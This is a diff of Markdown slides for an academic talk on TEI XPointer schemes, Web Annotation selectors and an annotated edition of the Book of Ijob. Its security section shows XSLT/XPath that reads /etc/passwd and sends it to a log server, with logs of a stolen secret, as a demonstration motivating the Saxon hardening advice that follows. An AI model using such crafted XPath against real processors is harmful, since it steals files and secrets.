@@ -5,20 +5,30 @@ title: TEI XPointer Schemes – Implementation and Example Application
 
 # TEI XPointer Schemes
 
+::: { .subtitle }
 
-## Table of Contents
+Implementation and Example Application
 
-::: incremental
+:::
 
-1. TEI XPointers Schemes
+::: { .attribution .text-left }
 
-1. XPointers + `<annotation>` = Web Annotations
+Johannes Schnocks, University of Münster <br/>
+Ludger Hiepel, University of Münster <br/>
+Christian Lück, University of Münster
 
-1. Usage Example
+:::
+
+## Table of Contents { .align-top .xxsmall }
+
+1. TEI XPointer Schemes
+
+1. `<tei:annotation>` + XPointers
+
+1. Example Application: Old Testament Studies
 
 1. Security
 
-:::
 
 # TEI XPointer Schemes
 
@@ -28,15 +38,15 @@ title: TEI XPointer Schemes – Implementation and Example Application
 
 - point to a portion of a document
 - not just `#idref`
-- describe the *portion* with XPath
-- `#xpath(/TEI[1]/text[1]//p[position() gt 42])`
+- describe the *portion* by XPath
+- `#xpath(/TEI[1]/text[1]//p[position() gt 4])`
 - point to a *point* inside the document
 - `#left(/TEI[1]/text[1]//p[4])`
-- describe the *point* with XPath and string offset
-- `#string-index(/TEI[1]/text[1]//p[4],23)`
-- point to a *range* between to points
+- describe the *point* by XPath and string offset
+- `#string-index(/TEI[1]/text[1]//p[4],10)`
+- point to a *range* between 2 points
 - `#range(left(/TEI[1]/text[1]//p[4]),right(/TEI[1]/text[1]//p[10]))`
-- `#string-range(/TEI[1]/text[1]//p[4],42,23)`
+- `#string-range(/TEI[1]/text[1]//p[4],10,42)`
 
 :::
 
@@ -80,18 +90,18 @@ Namespace scheme, part of the XPointer core standard.
 
 - syntax: XPath expressions may contain balanced parenthesis, and
   commas, that also delimit pointer 'arguments'
-- the syntax is not a regular language, but a CFG (cf. Chomsky)
+- the syntax is not a regular language, but a CFG (cf. Chomsky 1959)
 - parser needed
 - implementation comes in modules
   - parser for XPointer grammar (ANTLR)
   - API of XPath functions for doing something with XPointers
   - implementation of the XPointer processor based on Saxon
 
+[https://github.com/scdh/tei-xpointer-schemes](https://github.com/scdh/tei-xpointer-schemes)
+
 :::
 
 ## API { .align-top .xxsmall}
-
-::: incremental
 
 ::: { .text-left }
 
@@ -105,23 +115,19 @@ XPointers just point. However, you may want to dereference a pointer and get
 Let's have an API!
 
 :::
-:::
 
-## Let's have an API!
-
-::: incremental
+## Let's have an API! { .align-top .xxsmall }
 
 1. `xptr:get-sequence(doc as document(), xpointer as xs:string) as node()*` ✓
    - returns empty sequence for points, but a sequence for `#range(...)` etc.
 1. `xptr:is-sequence(xpointer as xs:string) as xs:boolean`
    - returns `true()` for sequence types
-1. `xptr:is-point(xpointer as xs:string) as xs:boolean`
-   - returns `true()` for point types
+1. `xptr:to-oa-selector(xpointer as xs:string, serialization as xs:string) as node()*` ✓
+   - returns an OA selector in any serialization: RDF/XML, Turtle, ...
 1. ...
 
-:::
 
-# `<tei:annotation>` 🎔 XPointers
+# `<tei:annotation>` <br/> + <br/> XPointers
 
 ## &lt;tei:annotation> { .align-top .xxsmall }
 
@@ -146,8 +152,14 @@ Is such a nice element!
 
 ... but lacks a friend!
 
-There is nobody around in TEI who can represent **selectors** like the
-selectors in the Web Annotation Data Model.
+:::
+
+. . .
+
+::: { .text-left style="font-weight:9000" }
+
+There is no component in TEI that––by specification––can represent
+selectors of the Web Annotation Data Model.
 
 :::
 
@@ -156,37 +168,168 @@ selectors in the Web Annotation Data Model.
 Except the guys from SATS!
 
 
-## XPointers translate to Selectors { .align-top .xxsmall }
+## XPointers translate to Selectors { .align-top .xxsmall  }
 
-::: {.columns style="margin-top: 1em"}
+::: {.columns style="margin-top: 1em" .xxxsmall }
 :::: {.column width="50%" .xxsmall }
 
 ```{xml}
 <listAnnotation>
-   <annotation ptr="">
+   <annotation
+	   id="annot1"
+	   xml:base="https://example.com/"
+	   target="MT.tei.xml#range(
+			   string-index(/TEI[1]/text[1]/body[1]/div[3]/p[2],50),
+			   string-index(/TEI[1]/text[1]/body[1]/div[3]/p[4],10))">
 	  <!-- annotation body -->
-	  <note>
-		 Some comment.
-	  </note>
+	  <note>My comment.</note>
    </annotation>
    ...
 </listAnnotation>
 ```
 
 ::::
-:::: {.column width="50%" .xxsmall }
+:::: {.column width="50%" .xxxsmall }
 
 ```{ttl}
-[] a triple .
+@prefix oa: <http://www.w3.org/ns/oa#> .
+@prefix rdf: <http://www.w3.org/1999/02/22-rdf-syntax-ns#> .
+@prefix ex: <https://example.com/annotations#> .
 
+ex:annot1
+    a oa:Annotation ;
+    oa:hasBody _annot1Body ;
+    oa:hasTarget [
+        oa:hasSource <https://example.com/MT.tei.xml> ;
+        oa:hasSelector [
+            a oa:RangeSelector ;
+            oa:hasStartSelector [
+                a oa:XPathSelector ;
+                rdf:value "/TEI[1]/text[1]/body[1]/div[3]/p[2]" ;
+                oa:refinedBy [
+                    a oa:FragmentSelector ;
+                    oa:conformsTo <http://tools.ietf.org/rfc/rfc5147> ;
+                    rdf:value "char=50" ] ] ;
+            oa:hasEndSelector [
+                a oa:XPathSelector ;
+                rdf:value "/TEI[1]/text[1]/body[1]/div[3]/p[4]" ;
+                oa:refinedBy [
+                    a oa:FragmentSelector ;
+                    oa:conformsTo <http://tools.ietf.org/rfc/rfc5147> ;
+                    rdf:value "char=10" ] ]
+            ] ] .
+
+_annot1body rdf:value "<note>My comment.</note>" .
+```
+::::
+:::
+
+# Example Application: <br/> Old Testament Studies
+
+## Example: Old Testament Studies { .align-top .xxsmall }
+
+- 3 ancient versions of the Book of Ijob
+  1. Masoretes' book of Ijob (MT)
+  1. translation of MT in Septuagint (LXX)
+  1. translation of MT in Targum (TG)
+- Research objective: A systematic recording and account of semantic
+  deferrals by translations
+- digital edition with synoptical represenation
+- annotations of semantic deferrals
+- translation of the 3 versions to German
+
+
+## Annotating Semantic Deferrals { .align-top .xxsmall }
+
+::: {.text-left}
+
+Ijob 12.5: *Torch* is translated to *appointment*/*point in time*.
+
+![](transformed.png){ width="80%" .align-top .xxsmall}
+
+:::
+
+## Model { .align-top .xxsmall }
+
+```{xml}
+<annotation
+	xml:id="a12.5_1"
+	target="MT.tei.xml#range(left(MT.12.5.6),right(MT.12.5.6))
+			LXX.tei.xml#range(left(LXX.12.5.1),right(LXX.12.5.2))
+			LXX.tei.xml#range(left(LXX.12.5.4),right(LXX.12.5.4))"
+    ana="trans:translation trans:semanticDeferral">
+   <note>
+	  LXX übersetzt den Konsonantenbestand, führt ihn aber auf <seg
+	  xml:lang="he">מעיד</seg> "Termin, Zeitpunkt" zurück.
+   </note>
+</annotation>
 ```
 
-::::
+. . .
+
+::: { .xxxsmall}
+```{xml}
+<listPrefixDef>
+   <!-- single segment in MT -->
+   <prefixDef
+	   ident="mt" matchPattern="(\d+)((\.\d+){0,3})$"
+       replacementPattern="MT.tei.xml#MT.$1$2"/>
+   <!-- word to word in MT -->
+   <prefixDef
+	   ident="mt" matchPattern="(\d+)(\.\d+)(\.\d+)-(\d+)"
+       replacementPattern="MT.tei.xml#range(left(MT.$1$2$3), right(MT.$1$2.$4))"/>
+   <!-- consonant to consonant in MT -->
+   <prefixDef
+	   ident="mt" matchPattern="(\d+)(\.\d+)(\.\d+)(\.\d+)-(\d+)"
+       replacementPattern="MT.tei.xml#range(left(MT.$1$2$3$4), right(MT.$1$2$3.$5))"/>
+   <!-- mixed in MT -->
+   <prefixDef
+	   ident="mt" matchPattern="(\d+)((\.\d+){1,3})-(\d+)((\.\d+){1,3})"
+       replacementPattern="MT.tei.xml#range(left(MT.$1$2), right(MT.$3$4))"/>
+   ...
+</listPrefixDef>
+```
 :::
 
 
 
+## Refined Model { .align-top .xxsmall }
+
+```{xml}
+<annotation
+	xml:id="a12.5_1" target="mt:12.5.6 lxx:12.5.1-2 lxx:12.5.4"
+    ana="trans:translation trans:semanticDeferral">
+   <note>
+	  LXX übersetzt den Konsonantenbestand, führt ihn aber auf <seg
+	  xml:lang="he">מעיד</seg> "Termin, Zeitpunkt" zurück.
+   </note>
+</annotation>
+```
+
+
+- expressions in `annotation/@target` expand to XPointers
+- their structure (syntax) comes very close to the researchers' mental model of the text
+- thus are very easy to apply and very expressive
+- seamless conversion of TEI annotations to Web Annotations Data Model with its Selectors 
+
+
+## ![](transformed.png){ width="80%" .align-top .xxsmall}
+![](synopsis.png){ width="80%" }
+
 # Security
+
+## Security Risk of XPointers
+
+::: incremental
+
+- The XPointer Processor has to evaluate XPath expressions.
+- XPath expressions can contain malicious code.
+- Not only an issue of XPointers, but of **any X-Technology** that is
+  able to evaluate XPath expressions or requires XPath evaluation:
+  XSLT, XQuery, `<tei:cRefPattern>`, `<tei:citeStructure>`, Selectors
+  in Web Annotations, ...
+
+:::
 
 
 ## Crafting XPath for Stealing Secrets { .align-top }
@@ -218,10 +361,10 @@ Logs on the Server
 ```
 b'secret\n'
 SECRET
-127.0.0.1 - - [04/Sep/2023 18:55:36] "GET /log?plain=SECRET&base64=c2VjcmV0Cg== HTTP/1.1" 200 -
+127.0.0.1 - - [03/Sep/2023 18:55:36] "GET /log?plain=SECRET&base64=c2VjcmV0Cg== HTTP/1.1" 200 -
 ```
 
-## Log-Server { .align-top }
+## Log Server { .align-top }
 
 ::: {.xxsmall}
 ::: {.xxsmall}
@@ -278,9 +421,9 @@ Identity Transformation, but steals `/etc/passwd`:
                     },
                     $read := unparsed-text($file),
                     $encoded := replace($read, '\s+', '_') => serialize($encoding),
-                    $sent := doc(concat($logserver, $encoded))
+                    $response := doc(concat($logserver, $encoded))
                 return
-                    xs:boolean($sent/*:b/text())">
+                    xs:boolean($response/*:b/text())">
             <xsl:apply-templates/>
         </xsl:if>
     </xsl:template>
@@ -289,28 +432,27 @@ Identity Transformation, but steals `/etc/passwd`:
 :::
 :::
 
-## Security Risk of XPointers
 
-::: incremental
-::: {.xxsmall}
-- The XPointer Processor has to evaluate XPath expressions.
-- These expressions may contain malicious code.
-- Not only an issue of XPointers, but, as seen, of **any
-  X-Technology** that is able to evaluate XPath expressions or
-  requires XPath evaluation: XSLT, XQuery, `<tei:cRefPattern>`,
-  `<tei:citeStructure>`, Selectors in Web Annotations, ...
+## Hardening XPointer Processors { .align-top .xxsmall }
 
-:::
+::: { .text-left }
 
 => We have to harden our runtime against such attacks.
 
 :::
 
-## Hardening XPointer Processors { .align-top .xxsmall }
+. . .
 
+::: { .text-left }
 
 1. On Server: Do not allow access to local file system
 1. On Desktop: Do not allow access to outside world
+
+:::
+
+. . .
+
+::: { .xsmall .text-left }
 
 Use a Saxon config file like this:
 
@@ -327,10 +469,11 @@ java -cp saxon.jar:other.jar net.sf.saxon.Trans -config:saxon.xml ...
     />
 </configuration>
 ```
+:::
 
-## Hardening using custom URI Resolvers { .align-top .xxsmall }
+## Hardening with URI Resolvers { .align-top .xxsmall }
 
-::: { .xsmall }
+::: { .xsmall .text-left }
 
 Saxon uses URI resolvers for processing all kinds of requests. You can
 use hardened URI resolvers that allow access to specific paths of your
@@ -357,6 +500,27 @@ exception.
 java -DallowedPath=/home/me/projects -cp saxon.jar:harden.jar:other.jar \
 	net.sf.saxon.Trans -config:saxon.xml ...
 ```
+
+# References { .align-top .xxsmall }
+
+- Chomsky, N. (1959). On Certain Formal Properties of Grammars. In:
+  Information and Control 2, 137-167.
+
+- Grosso, P. et al. (2003). XPointer Framework. W3C Recommendation 25
+  March 2003. [https://www.w3.org/TR/xptr-framework/](https://www.w3.org/TR/xptr-framework/)
+
+- TEI. (2023). P5: Guidelines for Electronic Text Encoding and
+  Interchange. Version 4.6.0. Last updated on 4th April 2023, revision
+  f18deffba. [https://tei-c.org/release/doc/tei-p5-doc/en/html/index.html](https://tei-c.org/release/doc/tei-p5-doc/en/html/index.html)
+
+- Sanderson, R. et al. (2017). Web Annotation Vocabulary W3C
+  Recommendation 23
+  February 2017. [https://www.w3.org/TR/annotation-vocab/](https://www.w3.org/TR/annotation-vocab/)
+
+- Cayless, H. (2013). Rebooting TEI Pointers. In: Journal of the Text
+  Encoding Initiative. Issue 6, 2013. doi
+  [10.4000/jtei.907](https://doi.org/10.4000/jtei.907)
+
 
 
 # Thanks!
